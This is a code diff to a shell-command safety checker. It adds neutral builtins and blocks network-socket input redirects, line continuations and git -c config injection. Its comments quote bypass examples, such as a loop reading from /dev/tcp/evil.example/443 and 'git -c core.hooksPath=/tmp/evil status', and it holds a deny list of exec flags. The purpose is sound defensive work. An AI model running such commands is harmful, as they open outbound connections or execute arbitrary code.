@@ -13,8 +13,37 @@
  * `extraVeto` hook of `matchCoveredCommand`.
  */
 
-/** Benign segments that may appear in a compound command without needing coverage. */
-export const NEUTRAL_PREFIXES: readonly string[] = ['cd', 'pwd', 'true', 'echo', ':'];
+/**
+ * Benign segments that may appear in a compound command without needing
+ * coverage.
+ *
+ * `read` (#1057 phase 3, commit 2) is a bash BUILTIN that assigns stdin to
+ * shell variables and executes nothing of its own -- its flags (`-r`, `-p`,
+ * `-a`, `-e`, ...) only change how it parses stdin, none of them run a
+ * command. It is the loop-header half of the `while read l; do ...; done`
+ * idiom (#999 already peels `while`/`do`/`done`), and before this addition
+ * the `read l` segment itself matched no prefix and had no path to being
+ * judged benign, so a body the rest of this module would otherwise cover
+ * (`grep`, `cat`, ...) still escalated on the header segment alone. Neutral,
+ * not a matched prefix: a command of ONLY neutral segments still matches
+ * nothing (`matchCoveredCommand` requires at least one real hit), so bare
+ * `read` alone stays uncovered by design -- see the paired test.
+ *
+ * `printf` (#1057 phase 3, commit 3) is the same inert class as `echo`: it
+ * writes only to stdout, takes no destination flag, and executes nothing of
+ * its own. Added after the #996 corpus showed a `for`-loop header using it
+ * purely for formatted progress text (`printf "obs #%s: " $p`) sinking an
+ * otherwise-covered read segment in the same loop body.
+ */
+export const NEUTRAL_PREFIXES: readonly string[] = [
+  'cd',
+  'pwd',
+  'true',
+  'echo',
+  ':',
+  'read',
+  'printf',
+];
 
 /*
  * ATTEMPT 5, REVERTED BEFORE MERGE: "a segment whose every word is an
@@ -155,6 +184,99 @@ const CASE_HEADER_RE = /^case\s+\S+\s+in$/;
 /** `break`/`continue` take an optional LEVEL COUNT, never a command. */
 const LOOP_CONTROL_RE = /^(?:break|continue)(?:\s+\d+)?$/;
 
+/**
+ * Characters a bare input-redirect PATH may contain once proven free of
+ * expansion: letters, digits, `_ . / ~ -`. No `$`, no quotes -- either would
+ * mean the shell rewrites the token before this text is what actually gets
+ * opened, and `isPlainInputRedirectResidue` runs on RAW residue text (no
+ * quote-masking has happened by this point), so a quote character has to be
+ * refused rather than trusted to bound a literal.
+ */
+const INPUT_REDIRECT_PATH_RE = /^[A-Za-z0-9_./~-]+$/;
+
+/**
+ * bash's virtual network-socket device paths: `< /dev/tcp/host/port` and
+ * `< /dev/udp/host/port` do not open a file at all -- bash special-cases
+ * these two spellings to open a TCP/UDP socket to `host:port` instead
+ * (bash(1), "Redirecting Input and Output" / "/dev/tcp/host/port"). Every
+ * character in `/dev/tcp/evil.example/443` is inside
+ * `INPUT_REDIRECT_PATH_RE`'s allowed set, so without this check the target
+ * looked exactly as "provably a plain file path" as `/dev/null` or
+ * `data.txt` to `isPlainInputRedirectResidue`, and `while read l; do cat $l;
+ * done < /dev/tcp/evil.example/443` was treated as pure inert grammar
+ * residue and waved through -- a live outbound network connection opened by
+ * a `while`/`done` loop header this module exists to prove runs nothing
+ * (#1062 C6, CONFIRMED). `/dev/null`, `/dev/stdin`, `/dev/fd/N` and every
+ * other `/dev/...` path are unaffected: this refuses exactly the two
+ * `tcp`/`udp` device names bash special-cases, nothing else under `/dev`.
+ */
+const NETWORK_DEV_PATH_RE = /^\/dev\/(tcp|udp)\//;
+
+/**
+ * One input-redirect clause inside a peeled residue: `< PATH` or `<<< WORD`
+ * (a here-string). `<<<` is tried before the single-`<` alternative so a
+ * here-string is never misread as a file redirect whose target happens to
+ * start with `<`.
+ */
+const RESIDUE_REDIRECT_CLAUSE_RE = /(<<<|<)\s*(\S+)/g;
+
+/**
+ * True if `rest` -- a `stripShellGrammar` peel residue -- consists SOLELY of
+ * one or more plain input-redirect clauses, each provably free of expansion:
+ * `< f`, `< ./data.txt`, `<<< abc`, or several of these in a row.
+ *
+ * Why this is safe to treat as structural exactly like an empty residue: the
+ * terminator or header this residue trails (`done`, `fi`, ...) already runs
+ * no command of its own -- that is the entire premise `stripShellGrammar`
+ * rests on -- and a bare input redirect on that same segment does not add
+ * one either. It only rebinds the compound's stdin to a file the shell opens
+ * for reading; nothing here runs, writes, or executes anything.
+ *
+ * Deliberately conservative, matching this module's established idiom of
+ * removing only what is PROVEN inert and leaving everything else visible so
+ * it still fails closed:
+ *
+ *   - a target containing `$` is refused -- expansion means this text is not
+ *     what the shell will actually open;
+ *   - a quoted target (`< "f"`) is refused -- this function runs on RAW text,
+ *     so a quote character is not provably a literal delimiter here, only a
+ *     character this recognizer does not understand;
+ *   - `<(...)` process substitution is refused by construction: its target
+ *     starts with `(`, outside both character classes below, and it is
+ *     independently vetoed by `hasShellControl` on the UNPEELED segment
+ *     regardless (that check runs before `stripShellGrammar` is ever called
+ *     -- see `matchCoveredCommand`), so this function does not need to, and
+ *     must not, weaken that.
+ *   - a `<` (not `<<<`) target under `/dev/tcp/` or `/dev/udp/` is refused
+ *     (#1062 C6) even though it is otherwise a syntactically plain path:
+ *     bash opens these two as a network socket, not a file -- see
+ *     `NETWORK_DEV_PATH_RE`'s doc for the mechanism. A `<<<` here-string
+ *     target is unaffected; it never opens its "target" as a path at all.
+ *
+ * Any gap between clauses that is not pure whitespace, or any trailing text
+ * after the last clause, fails the whole residue: a redirect clause is not
+ * ALL the residue contains, so nothing here is safe to wave through
+ * unexamined.
+ */
+function isPlainInputRedirectResidue(rest: string): boolean {
+  if (rest === '') return false;
+  const matches = [...rest.matchAll(RESIDUE_REDIRECT_CLAUSE_RE)];
+  if (matches.length === 0) return false;
+  let consumed = 0;
+  for (const match of matches) {
+    if (rest.slice(consumed, match.index).trim() !== '') return false;
+    const [whole, op, target] = match;
+    if (target === undefined) return false;
+    const targetOk =
+      op === '<<<'
+        ? !/[$`(\s]/.test(target)
+        : INPUT_REDIRECT_PATH_RE.test(target) && !NETWORK_DEV_PATH_RE.test(target);
+    if (!targetOk) return false;
+    consumed = match.index + whole.length;
+  }
+  return rest.slice(consumed).trim() === '';
+}
+
 /** A segment reduced to the command it actually runs, if any. */
 export interface StrippedSegment {
   /** What remains once leading grammar keywords are removed. */
@@ -193,6 +315,16 @@ export function stripShellGrammar(segment: string): StrippedSegment {
     if (FOR_HEADER_RE.test(rest) || CASE_HEADER_RE.test(rest) || LOOP_CONTROL_RE.test(rest)) {
       return { command: '', structural: true };
     }
+  }
+  // #1057 phase 3, commit 2: a residue that is SOLELY a plain input-redirect
+  // clause (`done < f`, `fi <<< abc`) trails a terminator/header that already
+  // runs no command -- see `isPlainInputRedirectResidue` for why rebinding
+  // stdin does not change that. Checked once, here, after every keyword has
+  // been peeled (including stacked ones), rather than inside the loop: a
+  // redirect clause never itself matches `GRAMMAR_PREFIX_KEYWORDS`, so it can
+  // only ever be reached as the loop's final residue.
+  if (isPlainInputRedirectResidue(rest)) {
+    return { command: '', structural: true };
   }
   return { command: rest, structural: rest === '' };
 }
@@ -582,6 +714,19 @@ export function maskQuotedSpans(segment: string): string {
  * visible after masking as before, and still vetoes.
  */
 export function hasShellControl(segment: string): boolean {
+  // Backslash-newline line continuation is deleted by bash's INPUT READER,
+  // before tokenization and before every check below runs on `maskQuotedSpans`,
+  // which instead masks the pair to `__` and leaves a two-character desync.
+  // That desync let `cat < /dev/t\<nl>cp/...` synthesize `/dev/tcp` past the
+  // device veto AND `cat $\<nl>(whoami)` split the `$(` substitution veto into
+  // RCE (#1063 seventh re-review; the `$(` half is a latent #1023 gap). This
+  // veto operates one layer above the input reader, so rather than reproduce
+  // bash's continuation-removal (which must honor single-quote/here-doc
+  // literalness -- see the follow-up issue), fail closed on the raw pair: a
+  // line-continued command is refused (escalated), never silently miscovered.
+  if (/\\\r?\n/.test(segment)) {
+    return true;
+  }
   const masked = maskQuotedSpans(segment);
   // Command / process substitution.
   if (masked.includes('$(') || masked.includes('`') || masked.includes('<(')) {
@@ -600,6 +745,86 @@ export function hasShellControl(segment: string): boolean {
     if (clause.target.kind !== 'discard' && clause.target.kind !== 'fd-dup') {
       return true;
     }
+  }
+  // Input redirection FROM a bash network device (`< /dev/tcp/host/port`,
+  // `N< /dev/udp/...`) opens an OUTBOUND socket -- an egress primitive a
+  // read-only prefix must never carry (#1063). `findRedirectClauses` models
+  // output redirects only, so ordinary `< file` input redirects are otherwise
+  // invisible here ON PURPOSE (they read, they neither run nor write, so
+  // `grep x < f` stays approvable). This narrows that only for the two device
+  // prefixes bash gives socket semantics; every other `< target` is untouched.
+  //
+  // Operator position from `masked`, target content from raw -- see the
+  // helper's doc for why neither view alone is sound, and why a `$` in the
+  // target fails closed.
+  if (hasNetworkDeviceInputRedirect(segment, masked)) {
+    return true;
+  }
+  return false;
+}
+
+/**
+ * True if `segment` redirects input from a bash network device
+ * (`/dev/tcp/...` or `/dev/udp/...`) -- an outbound socket open (#1063).
+ *
+ * Operator POSITION is decided from the MASKED view, target CONTENT from the
+ * raw text. This split is the whole design, learned over five re-reviews:
+ *
+ * - Masked (`maskQuotedSpans`, length-preserving so indices align with raw) is
+ *   the only view that locates operators correctly. A `<` that is quoted or
+ *   backslash-escaped (`'x<'`, `\<`) is a LITERAL argument, not an operator,
+ *   and masking rewrites it to `_` -- so it can neither be mistaken for an
+ *   operator nor GLUE onto the real one. A `shellWords`-token scan failed here:
+ *   quote-removal concatenated `'x<'<` into the token `x<<`, which the
+ *   heredoc-exclusion then skipped, opening the socket unseen.
+ * - Raw (dequoted) is the only view with the real target. Masking rewrites a
+ *   quoted target (`< "/dev/tcp/h/p"`) to `_`, which no anchored device regex
+ *   can match, while bash still opens it.
+ *
+ * A `<` that is part of `<<`/`<<<` (heredoc/here-string, no socket), `<(`
+ * (process substitution, refused earlier), `<&` (fd dup, not a path), or `<>`
+ * (read-write, carries a `>` the output-redirect check already vetoes) is not
+ * an input-file operator. The target is the word after it, up to the next
+ * whitespace or `<` (a second glued redirect is its own operator, found in its
+ * own pass).
+ *
+ * A target that is not a STATIC LITERAL fails closed. bash processes a redirect
+ * target through brace expansion, tilde, parameter/arithmetic/command expansion,
+ * quote removal, then globbing -- and several of those can materialize
+ * `/dev/tcp/...` from a literal that does not contain the substring: `$x/dev/tcp`
+ * and `/dev/t${x}cp` (empty `x`), `$'\x2fdev\x2ftcp...'`, and the brace RANGE
+ * `/dev/tc{p..p}/...` (collapses to `/dev/tcp/...`, no `$` needed). Six
+ * re-reviews chased these one transformation at a time; the durable rule is to
+ * refuse anything not statically resolvable rather than enumerate what is
+ * dangerous. The two expansion families that can SYNTHESIZE the device path are
+ * `$` (all `$`-expansions) and `{` (brace) -- both refuse (ADR 0010, err broad).
+ * Glob (`*?[]`) and tilde cannot: `/dev/tcp` is a virtual path with no directory
+ * entry, so a glob never matches it, and `~` expands to a home dir, so those
+ * stay approvable. This over-refuses an ordinary variable/brace target like
+ * `< $LOG` / `< a{1,2}.txt` toward escalate -- accepted; the reverse was a live
+ * egress. A target with no `$`/`{` is dequoted of `'`/`"`/`\` (non-expanding,
+ * purely literal) and matched against the device prefix. Command substitution
+ * `$(...)`/backtick and process substitution `<(` are refused by `hasShellControl`
+ * before this runs.
+ */
+function hasNetworkDeviceInputRedirect(segment: string, masked: string): boolean {
+  for (let i = 0; i < masked.length; i++) {
+    if (masked[i] !== '<') continue;
+    const prev = masked[i - 1];
+    const next = masked[i + 1];
+    if (prev === '<' || next === '<' || next === '(' || next === '&' || next === '>') continue;
+    // Skip whitespace after the operator, then take the target word up to the
+    // next whitespace or `<`.
+    let j = i + 1;
+    while (j < masked.length && (masked[j] === ' ' || masked[j] === '\t')) j++;
+    let k = j;
+    while (k < masked.length && masked[k] !== ' ' && masked[k] !== '\t' && masked[k] !== '<') k++;
+    if (k === j) continue;
+    const rawTarget = segment.slice(j, k);
+    // Any device-synthesizing expansion in the target is unresolvable -> refuse.
+    if (rawTarget.includes('$') || rawTarget.includes('{')) return true;
+    const dequoted = rawTarget.replace(/['"\\]/g, '');
+    if (NETWORK_DEV_PATH_RE.test(dequoted)) return true;
   }
   return false;
 }
@@ -635,14 +860,116 @@ const EXEC_PRIMITIVE_TOKEN =
   /(^|\s)(-exec|-execdir|-ok|-okdir|-delete|-fprintf|-fprint|-fprint0|-fls|--to-command|--use-compress-program|--rmt-command|--rsh-command|--checkpoint-action|--preload|--require|--eval|--exec)(\s|=|$)/;
 
 /**
+ * Walk `words` from `fromIndex`, skipping recognised flags (and, for a flag
+ * in `valueFlags`, its separate value token too), and return the index of
+ * the first non-flag token found — the actual subcommand once global flags
+ * are skipped past. Returns -1 if every remaining token is a flag.
+ *
+ * Moved here from `risk-bands.ts` (#1057 phase 3, commit 4) so
+ * `hasExecPrimitive`'s git `-c` veto (below) can share the SAME subcommand
+ * walk `risk-bands.ts` already uses for its own git/gh checks, rather than a
+ * second one that could disagree with it (#1000's law: two walks of the same
+ * question must never be able to drift). This module cannot import FROM
+ * `risk-bands.ts` — that module already imports `hasExecPrimitive` and
+ * friends from here, and the reverse would be a cycle — so the shared
+ * primitive lives on this side and `risk-bands.ts` imports it back.
+ */
+export function skipFlags(
+  words: readonly string[],
+  fromIndex: number,
+  valueFlags: ReadonlySet<string>,
+): number {
+  let i = fromIndex;
+  while (i < words.length) {
+    const token = words[i] ?? '';
+    if (!token.startsWith('-')) return i;
+    i++;
+    if (valueFlags.has(token)) i++;
+  }
+  return -1;
+}
+
+/** Global git flags that take a separate value token (not exhaustive — see `skipFlags`'s doc). */
+export const GIT_GLOBAL_VALUE_FLAGS: ReadonlySet<string> = new Set([
+  '-C',
+  '--git-dir',
+  '--work-tree',
+  '--namespace',
+  '--super-prefix',
+  '--exec-path',
+]);
+
+/** Index of `git`'s subcommand (`push`, `status`, ...), skipping global flags, or -1. */
+export function gitSubcommandIndex(words: readonly string[]): number {
+  if (words[0] !== 'git') return -1;
+  return skipFlags(words, 1, GIT_GLOBAL_VALUE_FLAGS);
+}
+
+/** Global gh flags that take a separate value token. */
+const GH_GLOBAL_VALUE_FLAGS: ReadonlySet<string> = new Set(['--repo', '-R', '--hostname']);
+
+/** Index of `gh`'s top-level subcommand (`pr`, `issue`, `api`, ...), skipping global flags, or -1. */
+export function ghTopIndex(words: readonly string[]): number {
+  if (words[0] !== 'gh') return -1;
+  return skipFlags(words, 1, GH_GLOBAL_VALUE_FLAGS);
+}
+
+/**
+ * `git -c <key>=<value> <subcommand>` runs arbitrary code (`core.hooksPath`,
+ * `core.fsmonitor`, ...) before the subcommand ever starts. `git switch -c
+ * <name>` and `git commit -c <commit>` reuse the SAME letter for an entirely
+ * unrelated, harmless, SUBCOMMAND-level flag (#962). A raw-text regex cannot
+ * tell those apart from presence alone — `EXEC_SCOPED_VETOES`'s uniform
+ * `(family, flag-regex)` shape below is exactly that, presence-only — so git
+ * is the one family that needs a token walk instead of an entry in that list,
+ * scoped by `gitSubcommandIndex` (shared with `risk-bands.ts`, never a second
+ * independent derivation of "where is the subcommand").
+ *
+ * git's own parser draws the identical line: a global option like `-c` is
+ * only recognised BEFORE the first non-option argument (the subcommand);
+ * everything from there on belongs to the subcommand's own parser, which may
+ * give the same letter a completely different meaning, or none at all. So a
+ * `-c` strictly before `gitSubcommandIndex` — or anywhere at all when no
+ * subcommand token exists (an all-flags command, including a bare trailing
+ * `git -c`, where `gitSubcommandIndex` returns -1) — is the exec primitive;
+ * a `-c` at or after it is not, REGARDLESS of whether that particular
+ * subcommand happens to define `-c` for itself. (`git worktree add`, for
+ * instance, has no `-c` of its own — verified via `git worktree add -h` — so
+ * `-c` there is simply an invalid option git will reject at parse time; that
+ * is a usability non-event, not a bypass, because git never reaches the
+ * global config-injection code path for a flag positioned after the
+ * subcommand it already committed to.)
+ *
+ * A token "carries" `-c` when it is: the standalone token `-c`; a
+ * `=`-attached `-c=value` (real git takes the value as a SEPARATE token, but
+ * matching the glued spelling too costs nothing and errs the safe direction,
+ * ADR 0010); or `c` bundled into a short-option cluster with other
+ * single-dash letters (`-uc`). Over-matching a shape git would itself reject
+ * is fine — this function only ever REFUSES on a match, so a false positive
+ * costs an extra escalation, never a wrongly-approved command.
+ */
+function hasPreSubcommandGitDashC(segment: string): boolean {
+  if (!/^git\b/.test(segment)) return false;
+  const words = shellWords(segment);
+  const subIdx = gitSubcommandIndex(words);
+  const end = subIdx === -1 ? words.length : subIdx;
+  for (let i = 1; i < end; i++) {
+    const token = words[i] ?? '';
+    if (token === '-c' || token.startsWith('-c=')) return true;
+    if (/^-[A-Za-z]+$/.test(token) && token.includes('c')) return true;
+  }
+  return false;
+}
+
+/**
  * Command families whose read form is flipped to code execution by a flag that
  * is harmless elsewhere, so the veto has to know which command it is looking at.
+ *
+ * git is deliberately NOT an entry here (#962) — see `hasPreSubcommandGitDashC`
+ * above for why it alone needs token position rather than a raw-text regex.
+ * Every other family keeps the original presence-only shape.
  */
 const EXEC_SCOPED_VETOES: ReadonlyArray<{ family: RegExp; flag: RegExp }> = [
-  // `git -c core.hooksPath=/tmp/evil status` and `git -c core.fsmonitor='...'`
-  // run arbitrary code on an otherwise read-only git command. No read form of
-  // git needs `-c`.
-  { family: /^git\b/, flag: /(^|\s)-c(\s|=)/ },
   // awk's program text can call system() or pipe into a shell.
   { family: /^(g|m|n)?awk\b/, flag: /(system\s*\(|\|\s*&?\s*"?\s*(sh|bash|zsh)\b|print\s*\|)/ },
   // `rsync -e 'sh -c ...'` / `--rsh` runs the "remote shell" locally.
@@ -655,6 +982,7 @@ const EXEC_SCOPED_VETOES: ReadonlyArray<{ family: RegExp; flag: RegExp }> = [
 /** True if a segment carries a code-execution primitive. */
 export function hasExecPrimitive(segment: string): boolean {
   if (EXEC_PRIMITIVE_TOKEN.test(segment)) return true;
+  if (hasPreSubcommandGitDashC(segment)) return true;
   for (const { family, flag } of EXEC_SCOPED_VETOES) {
     if (family.test(segment) && flag.test(segment)) return true;
   }
